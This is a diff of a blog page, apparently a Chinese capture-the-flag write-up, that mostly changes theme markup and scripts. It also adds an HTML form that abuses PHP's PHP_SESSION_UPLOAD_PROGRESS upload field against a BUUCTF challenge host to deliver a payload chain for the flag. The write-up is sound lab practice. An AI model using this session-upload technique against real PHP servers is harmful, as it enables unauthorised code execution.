class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="html">&lt;html&gt;
+&lt;body&gt;
+    &lt;form action=&quot;http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+        &lt;input type=&quot;submit&quot; /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
 <p>加上上面链子的payload.即可get_flag</p>
 
   
@@ -778,7 +1087,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -790,9 +1099,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -925,6 +1234,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1138,7 +1449,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1194,6 +1505,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
